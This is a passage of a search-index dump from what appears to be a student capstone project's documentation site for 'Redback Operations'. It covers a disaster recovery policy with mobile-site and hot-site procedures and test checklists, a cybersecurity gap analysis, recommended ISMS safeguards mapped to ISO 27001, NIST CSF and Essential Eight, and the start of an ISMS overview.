2024-2025","url":"/redback-documentation/docs/company-policy/Disaster Recovery Policy#disaster-action-checklist","content":" Plan Initiation​  Notify Senior Management: Immediately inform senior management about the occurrence of the disaster. Setup Disaster Recovery Team: Communicate with and assign roles for members of the disaster recovery team. Degree of Disaster: Find out how much extent and effect has this calamity had on Firm operations. Application Recovery Plan: This should be done based on the magnitude of damage it has caused with continuous monitoring as required. Backup Site Coordination: Fix timing and coordination with an alternative site which will host IT department should things go worse at current location? Vendor and Personnel Contact: All hardware/software vendors who are needed must be notified as well as all other employees involved. Service Disruption Notification: Users need to know when they can expect service interruptions to occur or how long these may continue for.  Follow-Up Checklist​  Logistics and Supplies: make arrangements for any cash emergency, transport means, accommodation and food services that may be necessary. Communication Setup: Verify that all team members have all contact info and create a user participation plan. Office Setup: In case of an emergency arrange for backup office supplies, rent or purchase necessary equipment and manage mail in/out deliveries. Operational Setup: Establish the order in which applications will be run; determine workstations and offline equipment requirements; check forms needed for each application to confirm they are operational. Preparation for Movement: Make sure everything is checked before it is moved to the backup site. This includes taking inventory of all data and equipment. Plan for additional item transportation. Documentation &amp; Maps: Generate multiple copies of every system or operational documentation, procedural manuals, as well as directions how to reach the backup location. Insurance notification: Inform insurance companies about the accident so that processing claims can begin.  Recovery Start-Up Procedures​  Disaster recovery services notification: Getting in touch with disaster recovery services on chosen recovery plan. The countdown begins when notice is received at guaranteed delivery time. 24/7 contact availability – Furnish Disaster Recovery Services with a delivery point address where equipment could be taken along with contacts and alternate contacts available round-the-clock.  ","version":"Next","tagName":"h2"},{"title":"Recovery plan-mobile site​","type":1,"pageTitle":"Redback Operations Disaster Recovery Policy 2024-2025","url":"/redback-documentation/docs/company-policy/Disaster Recovery Policy#recovery-plan-mobile-site","content":" 1. Notify the Disaster Recovery Team Lead of the nature of the disaster and the need to select the mobile site plan.  2. Confirm in writing the substance of the telephone notification to the Disaster Recovery Team Lead within 48 hours of the telephone notification.  3. Confirm all needed backup media are available to load the backup machine.  4. Prepare a purchase order to cover the use of backup equipment.  5. Notify the facilities manager of plans for a trailer and its placement  6. Depending on communication needs, notify telephone company Telstra of possible emergency line changes.  7. Begin setting up power and communications at the mobile site.  a. Power and communications are prearranged to hook into when trailer arrives.  b. At the point where telephone lines come into the building at the central junction, break the current linkage to the administration controllers. These lines are rerouted to lines going to the mobile site. They are linked to modems at the mobile site.  c. This action could conceivably require Teleco Inc. to redirect lines at the central complex to a more secure area in case of disaster.  8. When the trailer arrives, plug into power and do necessary checks.  9. Plug into the communications lines and do necessary checks.  10. Begin loading system from backups.  11. Begin normal operations as soon as possible:  a. Execute daily jobs as scheduled.  b. Perform daily saves to ensure no data is lost during the recovery phase.  c. Conduct weekly saves as part of the ongoing data protection strategy.  12. Plan a schedule to back up the system in order to restore it on a home-base computer when a permanent site is available. Continue using regular system backup procedures to maintain data integrity.  13. Secure mobile site and distribute keys as required.  14. Keep a maintenance log on mobile equipment.  ","version":"Next","tagName":"h2"},{"title":"Recovery plan-hot site​","type":1,"pageTitle":"Redback Operations Disaster Recovery Policy 2024-2025","url":"/redback-documentation/docs/company-policy/Disaster Recovery Policy#recovery-plan-hot-site","content":" The disaster recovery service provides an alternate hot site. The site has a backup system for temporary use while the home site is being reestablished.  Notify the Disaster Recovery Coordinator of the nature of the disaster and of its desire for a hot site.Request air shipment of modems to the hot site for communications.Confirm in writing the telephone notification to the Disaster Recovery Coordinator within 48 hours of the telephone notification.Begin making necessary travel arrangements to the site for the operations team.Confirm that all needed USB Devices are available and packed for shipment to restore on the backup system.Prepare a purchase order to cover the use of the backup system.Review the checklist for all necessary materials before departing to the hot site.Make sure that the disaster recovery team at the disaster site has the necessary information to begin restoring the site.Provide for travel expenses (cash advance).After arriving at the hot site, contact home base to establish communications procedures.Review materials brought to the hot site for completeness.Begin loading the system from the save USB Devices.Begin normal operations as soon as possible: Daily jobsDaily savesWeekly saves Plan the schedule to back up the hot-site system in order to restore on the home-base computer.  ","version":"Next","tagName":"h2"},{"title":"Restoring the entire system​","type":1,"pageTitle":"Redback Operations Disaster Recovery Policy 2024-2025","url":"/redback-documentation/docs/company-policy/Disaster Recovery Policy#restoring-the-entire-system","content":" To get your system back to the way it was before the disaster, use the procedures on recovering after a complete system loss in the Backup and Recovery  Before You Begin: Find the following USB Devices, equipment, and information from the on- site USB Devicesvault or the off-site storage location:  If you install from the alternate installation device, you need both your USB Devices media and the CD-ROM media containing the Licensed Internal Code.All USB Devices from the most recent complete save operationThe most recent USB Devices from saving security data (SAVSECDTA or SAVSYS)The most recent USB Devices from saving your configuration, if necessaryAll USB Devices containing journals and journal receivers saved since the most recent daily save operationAll USB Devices from the most recent daily save operationPTF list (stored with the most recent complete save USB Devices, weekly save USB Devices, or both)USB Deviceslist from most recent complete save operationUSB Deviceslist from most recent weekly save operationUSB Deviceslist from daily savesHistory log from the most recent complete save operationHistory log from the most recent weekly save operationHistory log from the daily save operationsThe Software Installation bookThe Backup and Recovery bookTelephone directoryModem manualTool kit  ","version":"Next","tagName":"h2"},{"title":"Rebuilding process​","type":1,"pageTitle":"Redback Operations Disaster Recovery Policy 2024-2025","url":"/redback-documentation/docs/company-policy/Disaster Recovery Policy#rebuilding-process","content":" The management team must assess the damage and begin the reconstruction of a new data center.  If the original site must be restored or replaced, the following are some of the factors to consider:  What is the projected availability of all needed computer equipment?Will it be more effective and efficient to upgrade the computer systems with newer equipment?What is the estimated time needed for repairs or construction of the data site?Is there an alternative site that more readily could be upgraded for computer purposes?  Once the decision to rebuild the data center has been made, go to Disaster site rebuilding section.  ","version":"Next","tagName":"h2"},{"title":"Testing the disaster recovery plan​","type":1,"pageTitle":"Redback Operations Disaster Recovery Policy 2024-2025","url":"/redback-documentation/docs/company-policy/Disaster Recovery Policy#testing-the-disaster-recovery-plan","content":" Frequent evaluation and adjustment of operation procedures to suit the shifting data processing systems within the organization is a vital step in implementing and carrying out trial runs on Redback Operation’s disaster recovery plan. This continuous process guarantees that the DR plan is up-to-date and efficient. Here are the systematic lists used to conduct recovery tests and detect areas where critical testing should be done as part of a DRP.  Item\tYes\tNo\tApplicable\tNot Applicable\tCommentsSelect the purpose of the test. What aspects of the plan are being evaluated? Applicable Trial recovery system from offsite backup. Describe the objectives of the test. How will you measure successful achievement of the objectives? Applicable Objectives include full system restoration within 4 hours and minimal data loss. Meet with management and explain the test and objectives. Gain their agreement and support.\tYes Management has been informed and is ready to support the planned downtime for testing Have management announce the test and the expected completion time.\tYes The test will be carried out on the next Saturday between 2 AM and 6 AM after it was announced. Collect test results at the end of the test period. Applicable Results should be recorded and studied too. Evaluate results. Was recovery successful? Why or why not? Applicable Assessment to be made based on recovery time as well as integrity post-recovery of data. Determine the implications of the test results. Does successful recovery in a simple case imply successful recovery for all critical jobs in the tolerable outage period? Applicable To be discussed during follow-up meeting. Make recommendations for changes. Call for responses by a given date. Applicable Recommendations for any required adjustments before next month should be made as well. Notify other areas of results. Include users and auditors.\tYes There is a plan to share findings widely while at the same time collecting responses from people about them also. Change the disaster recovery plan manual as necessary. Applicable Changes will be effected basing on test outcomes in addition to feedback given.  Table 6: Conducting a Recovery Test  Item\tYes\tNo\tApplicable\tNot Applicable\tCommentsRecovery of individual application systems by using files and documentation stored off-site. Applicable Very important in ensuring independent restoration of all apps. Reloading of system tapes and performing an IPL by using files and documentation stored off-site. Applicable This is a basic exercise that demonstrates whether or not systems can be restored. Ability to process on a different computer. Applicable If primary systems fail, this becomes an essentiality for business continuity purposes. Ability of management to determine priority of systems with limited processing.\tYes It tests management decision making under resource constraints. Ability to recover and process successfully without key people. Applicable Robustness of the system should also be tested alongside clarity in documentation procedures. Ability of the plan to clarify areas of responsibility and the chain of command.\tYes During crisis situations orderly mannerliness must always prevail hence its criticality . Effectiveness of security measures and security bypass procedures during the recovery period. Applicable Security protocols need to remain effective even in DR scenarios so verify that they still do work as expected. Ability to accomplish emergency evacuation and basic first-aid responses.\tYes Safety procedures ought to be effective as well as adequately practiced upon while here. Ability of users of real-time systems to cope with a temporary loss of on-line information. Applicable Adaptability by users together with effectiveness exhibited by temporary solutions shall therefore serve as measures too. Ability of users to continue day-to-day operations without applications or jobs that are considered noncritical. Applicable Evaluate the functioning relationship between critical and noncritical systems. Ability to contact the key people or their designated alternates quickly.\tYes Examine how well communication works and where it can be improved in an emergency. Ability of data entry personnel to provide the input to critical systems using alternate sites and different input media. Applicable Evaluate logistical support for remote operations Availability of peripheral equipment and processing, such as printers and scanners. Applicable Ensure that all the necessary hardware is working and available. Availability of support equipment, such as air conditioners and dehumidifiers. Applicable Check if environmental controls work under DR conditions. Availability of support: supplies, transportation, communication.\tYes This is important to ensure recovery efforts continue without interruption Distribution of output produced at the recovery site. Applicable Verify data handling and output distribution in DR mode Availability of important forms and paper stock. Applicable This is necessary to ensure paper-based operations can continue uninterrupted Ability to adapt plan to lesser disasters.\tYes Test the flexibility and scalability of the DR plan.  ","version":"Next","tagName":"h2"},{"title":"Please Note​","type":1,"pageTitle":"Redback Operations Disaster Recovery Policy 2024-2025","url":"/redback-documentation/docs/company-policy/Disaster Recovery Policy#please-note","content":" To view the original tables, styles and structure, as well as the Risk Matrix. Please view the original PDF below.   ","version":"Next","tagName":"h2"},{"title":"Cyber Security Gap Analysis Report","type":0,"sectionRef":"#","url":"/redback-documentation/docs/company-policy/ISMS/gap-analysis","content":"","keywords":"","version":"Next"},{"title":"Executive Summary​","type":1,"pageTitle":"Cyber Security Gap Analysis Report","url":"/redback-documentation/docs/company-policy/ISMS/gap-analysis#executive-summary","content":" This report highlights the current state of our IT and cybersecurity infrastructure, identifies key gaps in policies and procedures, and provides recommendations for enhancing our security posture. It addresses the need for a comprehensive Information Security Management System and outlines specific areas where existing policies lack depth or are entirely missing.  The purpose of this gap analysis is to assess Redback Operation’s current IT and cybersecurity policies against industry best practices and common security principles. Our focus has been on evaluating the overall robustness of our security policies and procedures across multiple layers of defence.  ","version":"Next","tagName":"h2"},{"title":"Current State Analysis​","type":1,"pageTitle":"Cyber Security Gap Analysis Report","url":"/redback-documentation/docs/company-policy/ISMS/gap-analysis#current-state-analysis","content":" ","version":"Next","tagName":"h2"},{"title":"IT Infrastructure & Technology Summary​","type":1,"pageTitle":"Cyber Security Gap Analysis Report","url":"/redback-documentation/docs/company-policy/ISMS/gap-analysis#it-infrastructure--technology-summary","content":" Currently all documentation references Google Cloud Platform. Redback Operations is currently undergoing a transitionary period of deploying on-premise &amp; additional cloud-based assets, such as Microsoft Azure. Due to this transitional state, technical debt exists that Redback Operations needs to address to reduce risk &amp; security gaps.  In this current transitional state, a complete gap analysis of technical policies &amp; controls is difficult to conduct. Therefore, this report focuses primarily on high-level security policy.  ","version":"Next","tagName":"h3"},{"title":"Cybersecurity Posture​","type":1,"pageTitle":"Cyber Security Gap Analysis Report","url":"/redback-documentation/docs/company-policy/ISMS/gap-analysis#cybersecurity-posture","content":" Our cybersecurity measures a limited range of policies, tools, and controls. Despite the limited existing measures, lack of a clear ISMS and security governance strategy, there are significant gaps in our security posture. Using defence in depth layers as a metric to measure security, there are significant gaps based on policy depth and coverage.  ","version":"Next","tagName":"h3"},{"title":"Regulatory and Industry Framework Compliance Overview​","type":1,"pageTitle":"Cyber Security Gap Analysis Report","url":"/redback-documentation/docs/company-policy/ISMS/gap-analysis#regulatory-and-industry-framework-compliance-overview","content":" Currently, Redback Operations adheres to the Australian Privacy Act. Comprehensive documentation exists that references the Australian Privacy Principles, which must be adhered to across the company for all initiatives that both Information Technology and Operational Technology related.  While minor references to the Essential 8 Framework is referenced across Redback Operations security guidelines, there is no real implemented industry security frameworks such as NIST, CIS or ASD ISM that are adhered to in the environment. The overall assessment is Redback Operations adheres to a limited set of incomplete or minor custom policies, resulting in low cyber maturity.  ","version":"Next","tagName":"h3"},{"title":"Gap Analysis​","type":1,"pageTitle":"Cyber Security Gap Analysis Report","url":"/redback-documentation/docs/company-policy/ISMS/gap-analysis#gap-analysis","content":" ","version":"Next","tagName":"h2"},{"title":"Policy, Procedure & Control Gaps for Redback Operations​","type":1,"pageTitle":"Cyber Security Gap Analysis Report","url":"/redback-documentation/docs/company-policy/ISMS/gap-analysis#policy-procedure--control-gaps-for-redback-operations","content":" Redback Operations faces exposure due to the absence of core IT and IT Security policies. Addressing these vulnerabilities is important for the security and operational efficiency of the company.  The core fundamental finding of this gap analysis report is the lack of a comprehensive Information Security Management System (ISMS).  The absence of formal policies across various domains of IT and cybersecurity has been identified as a critical vulnerability. While additional standards, policies, procedures &amp; guidelines will be required to improve cyber maturity, the policies outlined in this document are fundamental to the development of any ISMS and have been considered as a priority to be developed.  The following sections outline the policy gaps that have been identified, along with suggested subjects each policy should cover:  Data Classification &amp; Data Loss Prevention​  Gap Analysis Finding:  No policy exists.  Policy Objective &amp; Summary:  To mitigate risks associated with unauthorized data access and loss, ensuring the integrity and confidentiality of sensitive information.  Key Subjects:  Definition of data categories &amp; sensitivity controls (public, internal, confidential, and highly confidential).Define standards for data handling, storage, and transmission based on classification.Procedures for data loss prevention, including technological and process-based controls. Keep content agnostic to controls and not technology. Roles and responsibilities for data management and protection. Can also be defined as Data Mapping &amp; Ownership. Enhancement and integration with existing Data Breach reporting mechanisms.  Cloud Security (Microsoft Azure)​  Gap Analysis Finding:  No policy exists.  Policy Objective &amp; Summary:  To define standards and controls to be utilized for cloud-based assets. Policy design must cover risk mitigation for cloud-based environments against potential threats, referencing established frameworks and platform strategies.  Key Subjects:  Security responsibilities of the cloud provider versus the organization.Security policy and frameworks for deploying assets securely to Azure. May include deployment strategies, security tooling, network topologies &amp; individual security controls. Access control and identity management for cloud services.Secure development practices for cloud-based applications.  Endpoint Security​  Gap Analysis Finding:  Some minor policy coverage exists, primarily references the Essential 8 Framework. Policy lacks depth such as maturity levels or methodology to achieve framework adherence.  Objective: To protect all organizational devices against cyber threats, ensuring the security of data accessed and processed by these devices.  Key Subjects:  Mandatory security software requirements (antivirus, firewall, etc.).Regular update and patch management procedures.Secure configuration standards for all endpoints.References to the Essential 8 Framework  Server Security &amp; Hardening​  Gap Analysis Finding:  Some minor policy coverage exists, primarily the Essential 8 Framework. Policy lacks depth such as maturity levels or methodology to achieve framework adherence.  Objective: To establish secure server operations, minimizing vulnerabilities through stringent security practices and hardening techniques.  Key Subjects:  Hardening guidelines for operating systems and services.Patch management and vulnerability assessment schedule.Access control measures and use of secure administration protocols.Physical security measures for server environments.Monitoring and response strategies for server-related security events.Reference controls outlined in the Essential 8 Framework.  Encryption​  Gap Analysis Finding:  Some content regarding this topic exists but is not detailed regarding encryption standards. Existing content is related to existing infrastructure only and is not a high-level policy or standard.  Objective: To ensure the confidentiality and integrity of data in transit and at rest through the application of strong encryption standards.  Key Subjects:  Approved encryption algorithms and protocols.Key management lifecycle, including generation, storage, and destruction. May include references to Certificate Authority Design/Hierarchy. Use cases for encryption (data at rest, data in transit, etc.).Encryption audit and verification procedures.  Monitoring &amp; Log Analytics​  Gap Analysis Finding:  Some minor content coverage exists. Existing content relates to Google Chronicle and is not detailed regarding Monitoring &amp; Log Analytics in general. Existing content is related to GCP infrastructure and is not a high-level policy, standard or design.  Objective: To enable timely detection and response to security incidents through comprehensive monitoring and analysis of system logs.  Key Subjects:  Log collection and management policy, covering what must be logged, log format, and retention.Real-time monitoring and alerting mechanisms.Common incident response scenarios &amp; playbooks.References to common SOC (Security Operations Centre) design principles.  User Awareness Training​  Gap Analysis Finding:  No training content exists which covers security awareness training.  Objective: To create and support a security-conscious culture within the organization, empowering employees to recognize and respond to cybersecurity threats.  Key Subjects:  Overview of common cyber threats and attack vectors.Secure practices for email, web browsing, and device usage.Password management and multi-factor authentication.Reporting procedures for suspicious activities or incidents.Regular training schedule and policy compliance requirements.   External Attack Surface Management​  Gap Analysis Finding:  No policy exists.  Objective: To identify, map, assess, and secure external-facing assets, reducing the risk of attacks exploiting these exposures.  Key Subjects:  Inventory and classification of external-facing assets.Regular assessment procedures for identifying vulnerabilities.Remediation priorities and timelines for identified risks.Coordination with third parties for securing shared assets.Continuous improvement process for attack surface reduction.Policy compliance requirements for onboarding new assets.  BYOD &amp; Mobile Device Management​  Gap Analysis Finding:  No policy exists.  Objective: To establish control over personal devices used for work purposes, ensuring they meet organizational security standards.  Key Subjects:  Security requirements and controls for personal devices accessing corporate resources.Device registration and compliance verification processes.Data separation and encryption on personal devices.Lost or stolen device response procedures.Privacy considerations for employees and the organization.  ","version":"Next","tagName":"h3"},{"title":"Technical Gaps​","type":1,"pageTitle":"Cyber Security Gap Analysis Report","url":"/redback-documentation/docs/company-policy/ISMS/gap-analysis#technical-gaps","content":" Due to platform changes and a lack of technical security tooling due to pending implementations, technical gaps are considered not applicable currently.  ","version":"Next","tagName":"h3"},{"title":"Recommendations​","type":1,"pageTitle":"Cyber Security Gap Analysis Report","url":"/redback-documentation/docs/company-policy/ISMS/gap-analysis#recommendations","content":" ","version":"Next","tagName":"h2"},{"title":"Strategic Recommendations​","type":1,"pageTitle":"Cyber Security Gap Analysis Report","url":"/redback-documentation/docs/company-policy/ISMS/gap-analysis#strategic-recommendations","content":" Develop and implement comprehensive policies for each identified gap area, aligned with industry best practices and regulatory requirements.Establish a formal Information Security Management System to oversee policy implementation and compliance.Enhance user awareness training to cover critical cybersecurity threats and best practices.Implement technical measures to address identified vulnerabilities in network, server, and application security.Ensure Redback Operations ISMS is operational and actively used to guide the company towards maintaining a robust security posture.  ","version":"Next","tagName":"h3"},{"title":"Implementation Plan​","type":1,"pageTitle":"Cyber Security Gap Analysis Report","url":"/redback-documentation/docs/company-policy/ISMS/gap-analysis#implementation-plan","content":" The Redback Operations Infrastructure and Policy teams have already started addressing the gaps identified, including policy development, training programs, and technical security enhancements. Responsibilities are assigned to respective team members, with progress tracked via project management tools (Trello).  ","version":"Next","tagName":"h2"},{"title":"Conclusion​","type":1,"pageTitle":"Cyber Security Gap Analysis Report","url":"/redback-documentation/docs/company-policy/ISMS/gap-analysis#conclusion","content":" This gap analysis report underscores the urgent need for a comprehensive review and enhancement of Redback Operations IT and cybersecurity policies. By addressing the identified gaps, we can significantly improve our security posture and resilience against cyber threats.    ","version":"Next","tagName":"h2"},{"title":"Recommended Security Safeguards and Policies for Redback Operations ISMS","type":0,"sectionRef":"#","url":"/redback-documentation/docs/company-policy/ISMS/security-safeguards","content":"","keywords":"","version":"Next"},{"title":"Version History​","type":1,"pageTitle":"Recommended Security Safeguards and Policies for Redback Operations ISMS","url":"/redback-documentation/docs/company-policy/ISMS/security-safeguards#version-history","content":" Version\tDate\tAuthor\tApprover\tChanges1.0\t18/05/2025\tNathasha Liyanage Initial document creation  ","version":"Next","tagName":"h2"},{"title":"1. Purpose​","type":1,"pageTitle":"Recommended Security Safeguards and Policies for Redback Operations ISMS","url":"/redback-documentation/docs/company-policy/ISMS/security-safeguards#1-purpose","content":" This document outlines key security controls and policy measures recommended for the Redback Operations Information Security Management System (ISMS). It categorizes safeguards as partially addressed, missing-critical, or unnecessary, aligning with ISO/IEC 27001, NIST Cybersecurity Framework (CSF), GDPR/Australian Privacy Principles (APP), and Australia’s Essential Eight. Recommendations are tailored to Redback’s rotating team structure and decentralized operations, ensuring practical implementation for a student-led capstone project handling biometric data.  ","version":"Next","tagName":"h2"},{"title":"2. Scope​","type":1,"pageTitle":"Recommended Security Safeguards and Policies for Redback Operations ISMS","url":"/redback-documentation/docs/company-policy/ISMS/security-safeguards#2-scope","content":" The recommendations apply to all Redback Operations IT and Operational Technology (OT) assets, data (e.g., biometric datasets, source code, documentation), and personnel (e.g., students, mentors). They complement the ISMS and related policies (e.g., Cryptography, Data Classification &amp; DLP), focusing on governance, asset management, access control, data protection, secure development, and human factors.  ","version":"Next","tagName":"h2"},{"title":"3. Governance and Risk Management​","type":1,"pageTitle":"Recommended Security Safeguards and Policies for Redback Operations ISMS","url":"/redback-documentation/docs/company-policy/ISMS/security-safeguards#3-governance-and-risk-management","content":" Robust governance ensures accountability and compliance, per ISO 27001 Annex A.5 and NIST CSF Governance (GV).  Information Security Policy (Missing-Critical): Redback lacks a high-level policy defining security objectives and rules. ISO 27001 (A.5.1.1) and NIST CSF (GV.PO) require a formal policy with roles and responsibilities. Recommendation: Draft a policy outlining security goals, compliance requirements, and expectations for contributors.Roles and Responsibilities (Missing-Critical): Clear security duties are essential despite no HR department. NIST CSF (GV.RM) emphasizes coordinating compliance and infosec activities. Recommendation: Assign roles (e.g., ISMS Manager, Policy Owners) in the ISMS, documented for rotating teams.Risk Assessment and Treatment (Missing-Critical): Redback has no risk register or assessment process. ISO 27001 (Clause 6.1) and NIST CSF (ID.RA) require periodic risk analysis. Recommendation: Develop a risk register by Q3 2025, identifying threats (e.g., data breaches) and mitigation plans.Legal/Regulatory Compliance (Partially Addressed): Biometric data handling is subject to GDPR/APP, with partial coverage via university ethics approvals. Recommendation: Create a privacy policy compliant with APP Principle 11 and GDPR Article 9, addressing biometric data protection.ISMS Maintenance and Auditing (Missing, Manageable): Formal ISO 27001 audits are unnecessary, but self-auditing is feasible. Recommendation: Implement bi-annual informal reviews to assess ISMS effectiveness, per ISO 27001 Clause 9.  ","version":"Next","tagName":"h2"},{"title":"4. Asset Management and Data Classification​","type":1,"pageTitle":"Recommended Security Safeguards and Policies for Redback Operations ISMS","url":"/redback-documentation/docs/company-policy/ISMS/security-safeguards#4-asset-management-and-data-classification","content":" Proper asset management ensures protection of critical resources, per ISO 27001 A.8 and NIST CSF Identify (ID.AM).  Asset Inventory (Missing-Important): No centralized list of assets (e.g., code repositories, cloud services) exists. Recommendation: Create an inventory of assets (e.g., GitHub repos, Azure/GCP services, documentation portal) to prioritize protection.Data Classification and Handling (Missing-Critical): Biometric and project data lack classification. ISO 27001 (A.8.2.1) requires data categorization. Recommendation: Classify data as Public, Internal, Confidential, or Highly Confidential; store sensitive data in approved cloud folders with access controls (see Data Classification &amp; DLP Policy).Asset Ownership and Responsibilities (Partially Addressed): Informal ownership exists due to dynamic structure. Recommendation: Document ownership for major assets (e.g., repos, datasets), reassigning during team rotations.  ","version":"Next","tagName":"h2"},{"title":"5. Access Control​","type":1,"pageTitle":"Recommended Security Safeguards and Policies for Redback Operations ISMS","url":"/redback-documentation/docs/company-policy/ISMS/security-safeguards#5-access-control","content":" Effective access control manages permissions for rotating contributors, per ISO 27001 A.9 and NIST CSF Protect (PR.AC).  Account Lifecycle Management (Missing-Critical): No process exists for provisioning/de-provisioning accounts as students join/leave. Recommendation: Implement a formal process for account management, integrated with Deakin’s identity systems, per ISO 27001 A.9.2.Least Privilege and Role-Based Access (Partially Addressed): Minimal access is informally applied. Recommendation: Formalize an Access Control Policy (A.9.1.1) with role-based access controls (RBAC), reviewed quarterly.Multi-Factor Authentication (Missing-Critical): Simple credentials are used. Recommendation: Enable MFA for all cloud portals, code repositories, and sensitive systems, per NIST CSF PR.AC-7 and Essential Eight.Secure Authentication Practices (Partially Addressed): Strong passwords are encouraged but not enforced. Recommendation: Mandate personal accounts, strong passwords, and no credential sharing, per NIST CSF PR.AC.Session Management and Monitoring (Missing): No session controls or alerts for unusual sign-ins. Recommendation: Configure secure session settings (e.g., timeouts) and alerts for suspicious activity in shared portals.  ","version":"Next","tagName":"h2"},{"title":"6. Data Protection and Privacy Compliance​","type":1,"pageTitle":"Recommended Security Safeguards and Policies for Redback Operations ISMS","url":"/redback-documentation/docs/company-policy/ISMS/security-safeguards#6-data-protection-and-privacy-compliance","content":" Biometric data requires stringent protection, per GDPR/APP and ISO 27001 A.18.  Encryption of Data at Rest and In Transit (Missing): No consistent encryption beyond default cloud settings. Recommendation: Enable encryption for biometric datasets (e.g., AES-256 at rest, TLS 1.3 in transit) on cloud and local systems, per ISO 27001 A.10 (see Cryptography Policy).Data Minimization and Retention Policy (Missing-Critical): Data retention practices are unclear. Recommendation: Collect only necessary biometric data and destroy/anonymize unused data, per GDPR Article 5 and APP 11.2.Privacy Notice and Consent (Missing-Critical): No user notice or consent for biometric data collection. Recommendation: Develop a privacy notice and consent process, per GDPR Article 13 and APP 5, ensuring lawful data collection.  ","version":"Next","tagName":"h2"},{"title":"7. Secure Development and Operational Security​","type":1,"pageTitle":"Recommended Security Safeguards and Policies for Redback Operations ISMS","url":"/redback-documentation/docs/company-policy/ISMS/security-safeguards#7-secure-development-and-operational-security","content":" Security in development and operations reduces vulnerabilities, per ISO 27001 A.12/A.14 and NIST CSF Protect (PR.PT).  Secure Coding Practice (Missing-Important): No secure coding standards exist. Recommendation: Adopt a checklist (e.g., input validation, no hardcoded secrets) referencing OWASP Top 10, tailored to Redback’s tech stack.Code Review and Peer Review Process (Partially Addressed): Informal reviews occur. Recommendation: Mandate peer reviews for security via GitHub pull requests with branch protection, per ISO 27001 A.14.2.2.  ","version":"Next","tagName":"h2"},{"title":"8. Human Factors and Training​","type":1,"pageTitle":"Recommended Security Safeguards and Policies for Redback Operations ISMS","url":"/redback-documentation/docs/company-policy/ISMS/security-safeguards#8-human-factors-and-training","content":" Training and policies ensure contributors prioritize security, per ISO 27001 A.7 and NIST CSF Protect (PR.AT).  Security Awareness &amp; Onboarding (Missing-Critical): No project-specific security training. Recommendation: Develop an onboarding presentation covering policies, data handling, phishing, and incident reporting, with acknowledgement required.Acceptable Use &amp; BYOD Policy (Missing-Essential): No BYOD guidelines exist. Recommendation: Create a policy requiring OS updates, disk encryption (e.g., BitLocker), updated antivirus, and VPN use on public Wi-Fi, prohibiting unapproved storage (e.g., personal Dropbox).Confidentiality Agreement (Missing-Important): No formal data protection agreements. Recommendation: Require contributors to sign a confidentiality agreement for biometric data access, per ISO 27001 A.7.2.1.  ","version":"Next","tagName":"h2"},{"title":"9. Integration with ISMS​","type":1,"pageTitle":"Recommended Security Safeguards and Policies for Redback Operations ISMS","url":"/redback-documentation/docs/company-policy/ISMS/security-safeguards#9-integration-with-isms","content":" These recommendations should be prioritized in the ISMS implementation plan (see ISMS Guide, Section 12):  Phase 1 (Q3 2025): Draft critical policies (e.g., Information Security Policy, Data Classification, Privacy Notice).Phase 2 (Q4 2025): Implement MFA, encryption, and training; test controls via self-audits.Track progress via Trello, with bi-annual reviews to assess compliance and effectiveness.  ","version":"Next","tagName":"h2"},{"title":"10. References​","type":1,"pageTitle":"Recommended Security Safeguards and Policies for Redback Operations ISMS","url":"/redback-documentation/docs/company-policy/ISMS/security-safeguards#10-references","content":" [1] Netsurion. (n.d.). NIST Cybersecurity Framework. Available at: https://www.netsurion.com/regulatory-compliance/nist-csf[2] ICO. (2024). How do we keep biometric data secure? Available at: https://ico.org.uk/for-organisations/uk-gdpr-guidance-and-resources/lawful-basis/biometric-data-guidance-biometric-recognition/how-do-we-keep-biometric-data-secure/[3] Mohan, V. (2022). ISO 27001 Annex A.8 - Asset Management. Available at: https://sprinto.com/blog/iso-27001-annex-a-8-asset-management/[4] Irwin, L. (2019). What is information classification and how is it relevant to ISO 27001? Available at: https://www.itgovernance.co.uk/blog/what-is-information-classification-and-how-is-it-relevant-to-iso-27001[5] OAIC. (2019). Chapter 11: APP 11 Security of personal information. Available at: https://www.oaic.gov.au/privacy/australian-privacy-principles/australian-privacy-principles-guidelines/chapter-11-app-11-security-of-personal-information[6] Edwards, M. (2018). Annex A.9 – Access control. Available at: https://www.isms.online/iso-27001/annex-a-9-access-control/[7] Khan, A. (2024). NIST CSF PR.AC-7: Users, Devices, and Other Assets are Authenticated. Available at: https://grc-docs.com/blogs/nist-csf-framework-categories/nist-csf-pr-ac-7-users-devices-and-other-assets-are-authenticated[8] Convesio. (2024). The Impact of GDPR on Biometric Data. Available at: https://convesio.com/knowledgebase/article/the-impact-of-gdpr-on-biometric-data-what-you-need-to-know/Redback Operations ISMS Guide, Cryptography Policy, Data Classification &amp; DLP Policy, Endpoint Security Policy ","version":"Next","tagName":"h2"},{"title":"Information Security Management System","type":0,"sectionRef":"#","url":"/redback-documentation/docs/company-policy/ISMS/","content":"","keywords":"","version":"Next"},{"title":"Version History​","type":1,"pageTitle":"Information Security Management System","url":"/redback-documentation/docs/company-policy/ISMS/#version-history","content":" Version\tDate\tAuthor\tApprover\tChanges1.0\t05/04/2024\tKaleb Bowen Document Creation 2.0\t04/09/2024\tTom Mirarchi Fixed numbering for compliance, added links to policies, added sections 3.0\t18/05/2025\tNathasha Liyanage Unified ISMS with NIST CSF, Essential 8, APA/APPs; added objectives, phased implementation, team roles, 6-month review cycle  ","version":"Next","tagName":"h2"},{"title":"1. Purpose​","type":1,"pageTitle":"Information Security Management System","url":"/redback-documentation/docs/company-policy/ISMS/#1-purpose","content":" The Information Security Management System (ISMS) provides a unified framework for managing Redback Operations’ information security risks and ensuring compliance with ISO/IEC 27001, NIST Cybersecurity Framework (CSF), Essential Eight, and Australian Privacy Principles (APP). It consolidates policies to protect information assets during Redback’s transitional stage across Google Cloud Platform (GCP), Azure, on-premises systems, and research activities.  The ISMS aims to:  Achieve Essential 8 Maturity Level 1 to mitigate common cyber threats.Ensure full compliance with the Australian Privacy Act and APPs.Reduce technical debt-fuelled security risks by 50% within 12 months.Establish a defence-in-depth posture aligned with NIST CSF functions: Identify, Protect, Detect, Respond, Recover.  ","version":"Next","tagName":"h2"},{"title":"2. Scope​","type":1,"pageTitle":"Information Security Management System","url":"/redback-documentation/docs/company-policy/ISMS/#2-scope","content":" The Information Security Management System (ISMS) establishes the guiding principles and policies for Redback Operations, being the comprehensive and overarching system complying with ISO/IEC 27001. This document is intended to provide a framework for Redback Operations and affiliated contributors to implement and continuously manage the security of its information assets.  The scope of this ISMS includes all information assets, including but not limited to:  Data Classification &amp; Data Loss Prevention (DLP)Cloud Security (GCP, Azure)Server Security &amp; HardeningEndpoint Security (e.g., laptops, smart wearables, exercise bikes)Encryption / CryptographyMonitoring &amp; Log AnalysisUser Awareness TrainingExternal Attack Surface Management (EASM)Bring Your Own Device 